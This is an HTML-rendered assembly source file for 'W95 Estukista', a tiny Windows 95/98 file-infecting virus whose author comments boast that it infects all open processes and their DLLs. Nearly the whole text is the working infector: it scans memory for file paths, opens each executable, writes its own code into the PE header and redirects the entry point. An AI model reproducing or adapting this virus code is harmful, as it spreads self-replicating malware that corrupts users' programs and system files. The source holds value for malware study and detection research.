<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>estukista.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;--------------------------------  W95 ESTUKISTA BY HenKy -----------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-AUTHOR:        HenKy</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-MAIL:          HenKy_@latinmail.com</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;-ORIGIN:        SPAIN</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">

</span><span class="sc1">;                            VIRUS_SIZE = 126 BYTES!!!!</span><span class="sc0">

 </span><span class="sc1">; 100% FUNCTIONAL UNDER W95/98 !!!!! AND IS RING 3!!!!!! </span><span class="sc0">
      
 </span><span class="sc1">; (NOT TESTED UNDER ME)</span><span class="sc0">

 </span><span class="sc1">; INFECTS *ALL* OPEN PROCESES AND EVEN ALL DLL AND MODULES IMPORTED BY THEM</span><span class="sc0">
 
 </span><span class="sc1">; THE 0C1000000H ADDRESS IS USED AS BUFFER BECOZ WE HAVE WRITE/READ PRIVILEGES</span><span class="sc0">

 </span><span class="sc1">; THE BFF712B9h ADDRESS IS THE CALL VINT21 </span><span class="sc0">

 </span><span class="sc1">; THE INITIAL ESI VALUE POINTS TO A READABLE MEMORY ZONE (SEEMS TO BE A CACHE ONE</span><span class="sc0">

 </span><span class="sc1">; WHERE WINDOWS LOADS THE PE HEADER, THE IMPORTANT THING IS THAT HERE U CAN FIND</span><span class="sc0">

 </span><span class="sc1">; THE FILENAMES WITH COMPLETE PATH OF ALL OPEN PROCESES)</span><span class="sc0">


</span><span class="sc1">;BUGS:  * THE BAD THING IS THAT ESI INITIAL VALUE ON SOME FILES POINTS TO KERNEL, CAUSING</span><span class="sc0">
</span><span class="sc1">;         THAT NO FILENAME FOUND (VIRUS WILL INFECT NOTHING AND WILL RETURN TO HOST).</span><span class="sc0">

</span><span class="sc1">;        * ANOTHER POSSIBLE BUG IS THAT 0C1000000H MAYBE NOT READ/WRITE ON ALL COMPUTERS</span><span class="sc0">
</span><span class="sc1">;         (AT LEAST IN MY W95 AND W98 WORKS FINE, AND INTO COMPUTER'S FRIEND WITH 98 WORKS TOO)</span><span class="sc0">

</span><span class="sc1">;        * AND THE MORE PAINLY THING IS THE MASK LIMIT.... IF VERY LOW-&gt; LESS INFECTIOUS</span><span class="sc0">
</span><span class="sc1">;          IF VERY HIGH-&gt; RISK OF READ NON-MAPPED AREA (AS WE ARE IN RING 3 IT WILL HANG WINDOZE)</span><span class="sc0">

</span><span class="sc1">; ANYWAY IN MY TESTS A LOT OF FILES BECOME INFECTED , MANY OF THEM WINDOWS DLL'S</span><span class="sc0">


</span><span class="sc1">;DUMP OF INITIAL ESI VALUE OF MY COMPILED BINARY (I HAVE AN OPEN PROCESS CALLED AZPR.EXE)</span><span class="sc0">



</span><span class="sc1">;81621788 FF FF FF FF 04 00 00 00 00 00 00 00 00 00 00 00 ˇˇˇˇ               </span><span class="sc0">
</span><span class="sc1">;81621798 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;816217A8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;816217B8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;816217C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;816217D8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;816217E8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;816217F8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;81621808 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;81621818 00 00 00 00 00 00 00 00 20 00 00 A0 43 3A 5C 57            †C:\W    </span><span class="sc0">
</span><span class="sc1">;81621828 49 4E 50 52 4F 47 5C 41 5A 50 52 5C 41 5A 50 52 INPROG\AZPR\AZPR    </span><span class="sc0">
</span><span class="sc1">;81621838 2E 45 58 45 20 00 00 00 48 00 00 A0 44 00 00 00 .EXE    H  †D       </span><span class="sc0">

</span><span class="sc1">; ....</span><span class="sc0">

</span><span class="sc1">;81621CD8 50 A0 D7 82 3C 02 00 A0 50 45 00 00 4C 01 08 00 P†◊Ç&lt; †PE  L    </span><span class="sc0">
</span><span class="sc1">;81621CE8 A0 95 37 39 00 00 00 00 00 00 00 00 E0 00 82 01 †ï79        ‡ Ç    </span><span class="sc0">
</span><span class="sc1">;81621CF8 0B 01 02 12 00 22 02 00 00 A8 00 00 00 50 05 00  "  ®   P     </span><span class="sc0">
</span><span class="sc1">;81621D08 01 40 0B 00 00 10 00 00 00 40 02 00 00 00 40 00 @     @   @     </span><span class="sc0">
</span><span class="sc1">;81621D18 00 10 00 00 00 02 00 00 01 00 0B 00 00 00 00 00                 </span><span class="sc0">
</span><span class="sc1">;81621D28 04 00 00 00 00 00 00 00 00 90 0C 00 00 04 00 00         ê        </span><span class="sc0">
</span><span class="sc1">;81621D38 00 00 00 00 02 00 00 00 00 00 04 00 00 00 01 00                  </span><span class="sc0">
</span><span class="sc1">;81621D48 00 20 00 00 00 10 00 00 00 00 00 00 10 00 00 00                   </span><span class="sc0">
</span><span class="sc1">;81621D58 00 00 00 00 00 00 00 00 64 54 0B 00 D4 01 00 00         dT ‘      </span><span class="sc0">
</span><span class="sc1">;81621D68 00 A0 08 00 00 94 02 00 00 00 00 00 00 00 00 00  †  î             </span><span class="sc0">
</span><span class="sc1">;81621D78 00 00 00 00 00 00 00 00 CC 52 0B 00 08 00 00 00         ÃR        </span><span class="sc0">
</span><span class="sc1">;81621D88 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;81621D98 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;81621DA8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;81621DB8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00                     </span><span class="sc0">
</span><span class="sc1">;81621DC8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 00                    </span><span class="sc0">
</span><span class="sc1">;81621DD8 2E 74 65 78 74 00 00 00 00 30 02 00 00 10 00 00 .text    0        </span><span class="sc0">
</span><span class="sc1">;81621DE8 00 C0 00 00 00 04 00 00 00 00 00 00 00 00 00 00  ¿                 </span><span class="sc0">
</span><span class="sc1">;81621DF8 00 00 00 00 40 00 00 C0 2E 69 64 61 74 61 00 00     @  ¿.idata      </span><span class="sc0">
</span><span class="sc1">;81621E08 00 20 00 00 00 40 02 00 00 04 00 00 00 C4 00 00      @     ƒ      </span><span class="sc0">
</span><span class="sc1">;81621E18 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0             @  ¿    </span><span class="sc0">

</span><span class="sc1">; ....</span><span class="sc0">

</span><span class="sc1">;81621E38 00 1C 00 00 00 C8 00 00 00 00 00 00 00 00 00 00     »              </span><span class="sc0">
</span><span class="sc1">;81621E48 00 00 00 00 40 00 00 C0 2E 62 73 73 00 00 00 00     @  ¿.bss        </span><span class="sc0">
</span><span class="sc1">;81621E58 00 50 05 00 00 00 03 00 00 50 05 00 00 00 00 00  P     P         </span><span class="sc0">
</span><span class="sc1">;81621E68 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0             @  ¿    </span><span class="sc0">
</span><span class="sc1">;81621E78 2E 72 65 6C 6F 63 00 00 00 50 00 00 00 50 08 00 .reloc   P   P     </span><span class="sc0">
</span><span class="sc1">;81621E88 00 00 00 00 00 E4 00 00 00 00 00 00 00 00 00 00      ‰              </span><span class="sc0">
</span><span class="sc1">;81621E98 00 00 00 00 40 00 00 C0 2E 72 73 72 63 00 00 00     @  ¿.rsrc       </span><span class="sc0">
</span><span class="sc1">;81621EA8 00 A0 02 00 00 A0 08 00 00 9A 01 00 00 E4 00 00  †  †  ö  ‰      </span><span class="sc0">
</span><span class="sc1">;81621EB8 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0             @  ¿    </span><span class="sc0">
</span><span class="sc1">;81621EC8 61 73 70 72 00 00 00 00 00 40 01 00 00 40 0B 00 aspr     @  @     </span><span class="sc0">
</span><span class="sc1">;81621ED8 00 3A 01 00 00 7E 02 00 00 00 00 00 00 00 00 00  :  ~             </span><span class="sc0">
</span><span class="sc1">;81621EE8 00 00 00 00 50 08 00 C0 2E 64 61 74 61 00 00 00     P ¿.data       </span><span class="sc0">
</span><span class="sc1">;81621EF8 00 10 00 00 00 80 0C 00 00 00 00 00 00 B8 03 00     Ä      ∏     </span><span class="sc0">
</span><span class="sc1">;81621F08 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0             @  ¿    </span><span class="sc0">
</span><span class="sc1">;81621F18 40 00 00 A0 00 00 00 00 E0 1C 62 81 FF FF FF FF @  †    ‡bÅˇˇˇˇ    </span><span class="sc0">
</span><span class="sc1">;81621F28 E0 13 62 81 F0 13 62 81 18 00 08 00 8F 02 00 00 ‡bÅbÅ  è      </span><span class="sc0">
</span><span class="sc1">;81621F38 08 00 00 00 00 00 00 00 00 00 40 00 D7 2B 01 00          @ ◊+     </span><span class="sc0">
</span><span class="sc1">;81621F48 30 23 62 81 5C 1F 62 81 18 00 6C 1F 62 81 08 00 0#bÅ\bÅ lbÅ     </span><span class="sc0">
</span><span class="sc1">;81621F58 20 00 00 A0 43 3A 5C 57 49 4E 50 52 4F 47 5C 41    †C:\WINPROG\A    </span><span class="sc0">
</span><span class="sc1">;81621F68 5A 50 52 5C 41 5A 50 52 2E 45 58 45 00 CC CC CC ZPR\AZPR.EXE ÃÃÃ    </span><span class="sc0">
</span><span class="sc1">;81621F78 B4 03 00 A0 4E 45 01 00 00 00 00 00 00 00 8C 03 ¥ †NE       å  </span><span class="sc0">

</span><span class="sc1">; ....  </span><span class="sc0">


</span><span class="sc2">.586P</span><span class="sc0">
</span><span class="sc5">PMMX</span><span class="sc0">       </span><span class="sc1">; WORF...  ... JEJEJE</span><span class="sc0">
</span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">FLAT</span><span class="sc0">
</span><span class="sc5">LOCALS</span><span class="sc0">

</span><span class="sc9">EXTRN</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc5">MIX_SIZ</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">FILE_END</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MEGAMIX</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">MACROSIZE</span><span class="sc0">   </span><span class="sc9">MACRO</span><span class="sc0">                   
            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">MIX_SIZ</span><span class="sc4">/</span><span class="sc2">00100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">MIX_SIZ</span><span class="sc4">/</span><span class="sc2">00010</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">MIX_SIZ</span><span class="sc4">/</span><span class="sc2">00001</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc3">"0"</span><span class="sc0">
            </span><span class="sc9">ENDM</span><span class="sc0">    
</span><span class="sc9">.DATA</span><span class="sc0">
        
 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  

 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'SIZE = '</span><span class="sc0"> 
     </span><span class="sc5">MACROSIZE</span><span class="sc0">                

</span><span class="sc9">.CODE</span><span class="sc0">

       
</span><span class="sc5">MEGAMIX</span><span class="sc4">:</span><span class="sc0"> 
         </span><span class="sc1">; EAX: EIP</span><span class="sc0">
         </span><span class="sc1">; ESI: BUFFER</span><span class="sc0">
         

</span><span class="sc5">VINT21</span><span class="sc4">:</span><span class="sc0">             
        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0BFF712B9h</span><span class="sc0">   </span><span class="sc1">; MOV ECX,048BFF71H  ;-) Z0MBiE</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc12">'H'</span><span class="sc0">          </span><span class="sc1">; HenKy ;P</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">   </span><span class="sc1">; EDI: DELTA</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">    </span><span class="sc1">; EDX=ESI: CACHE BUFFER   (ESPORE BUG)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc2">0C1000000H</span><span class="sc0">  </span><span class="sc1">; ESI: MY DATA BUFFER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">    </span><span class="sc1">; NOW: EBP=EDI=DELTA=INT21H</span><span class="sc0">

        </span><span class="sc1">;EDX: POINTER TO FNAME</span><span class="sc0">

        </span><span class="sc1">;LEA EDX,POPOPOP ; FOR DEBUG ONLY</span><span class="sc0">
        </span><span class="sc1">;JMP KAA</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">28000</span><span class="sc0"> </span><span class="sc1">; LIMIT </span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">

</span><span class="sc5">AMIMELASUDA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">POPAD</span><span class="sc0">
</span><span class="sc5">PORK</span><span class="sc4">:</span><span class="sc0">   
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc12">':C'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">KAA</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">PORK</span><span class="sc0">


</span><span class="sc5">WARNING</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">00401000H</span><span class="sc0"> </span><span class="sc1">; ANOTHER ESPORE BUG CORRECTED :)</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
   
</span><span class="sc5">KAA</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">PUSHAD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">      </span><span class="sc1">; open                 </span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                  
        </span><span class="sc6">JC</span><span class="sc0">   </span><span class="sc5">AMIMELASUDA</span><span class="sc0">    
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">               
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">4H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">      </span><span class="sc1">;read          </span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">          
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">  </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">ECX</span><span class="sc0">
         
 </span><span class="sc5">DEPOTA</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc12">'B'</span><span class="sc1">; HEHEHEHE</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GOSTRO</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">DEPOTA</span><span class="sc0">
 </span><span class="sc5">GOSTRO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">  </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">  </span><span class="sc6">MOVSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">  </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">28H</span><span class="sc4">],</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">  </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">   </span><span class="sc5">CLOZ</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">  </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">34H</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">-</span><span class="sc5">MONGORE</span><span class="sc4">],</span><span class="sc8">EDI</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">  </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0"> 
        </span><span class="sc6">PUSHAD</span><span class="sc0">                            
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">                     
        </span><span class="sc6">CDQ</span><span class="sc0">                            
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                        
        </span><span class="sc6">POPAD</span><span class="sc0">        
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">4H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0"> </span><span class="sc1">; write        </span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">CLOZ</span><span class="sc4">:</span><span class="sc0">  
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0"> </span><span class="sc1">; close</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">AMIMELASUDA</span><span class="sc0">
        
</span><span class="sc5">FILE_END</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;-P</span><span class="sc0">

</span><span class="sc5">MONGORE</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">95</span><span class="sc0"> </span><span class="sc1">; OLD_EIP</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;POPOPOP DB "H:\PRUEBAS\TEST.ZZZ",0</span><span class="sc0">

</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">MEGAMIX</span><span class="sc0">
</span></div></body>
</html>
